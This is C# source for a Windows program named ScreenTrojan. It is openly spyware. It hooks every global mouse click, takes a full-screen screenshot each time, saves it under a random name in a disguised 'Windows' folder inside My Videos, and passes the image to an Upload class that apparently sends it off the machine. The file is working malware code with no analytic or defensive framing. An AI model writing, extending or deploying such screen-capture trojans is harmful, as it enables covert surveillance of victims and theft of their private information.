using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using System.IO;


namespace ScreenTrojan
{
    public partial class Form1 : Form
    {
        
        public IKeyboardMouseEvents m_GlobalHook;
        Upload up = new Upload();
        //
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        String finalString = "";
        char[] stringChars = new char[8];
        Random random = new Random();

        //Image variables
        Screenshot capture = new Screenshot();
        String file_name;
        private Image img;

        //paths variiables
        String new_path;
        String env_path;
        String img_path;

        public Form1()
        {
            InitializeComponent();
            m_GlobalHook = Hook.GlobalEvents();
            m_GlobalHook.MouseDownExt += GlobalHookMouseDownExt;
            env_path = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
        }
        
        
        public async void Shot()
        {
            
            file_name = "screenshotfull_class" + RandomString() + ".jpg";
            env_path = new_path;
            img = capture.FullScreenshotWithClass(env_path, file_name, ImageFormat.Jpeg);
            img_path = env_path +"\\"+ @file_name;
            byte[] imgData = System.IO.File.ReadAllBytes(img_path);
            System.IO.Stream stream = new System.IO.MemoryStream(imgData);

            //Uploads the file
            up.Upload_File(stream, file_name);
           
          
  
            
            
            
        }

        

      

        public String RandomString()
        {
            //Generates random names for our image

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
             finalString = new String(stringChars);
            return finalString;
        }


        private void GlobalHookMouseDownExt(object sender, MouseEventExtArgs e)
        {
           //On Click => screenshot
            Shot();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //creates a new directory
            new_path = env_path + "\\Windows";
            DirectoryInfo di = Directory.CreateDirectory(new_path);
        }
      
    }

    

}
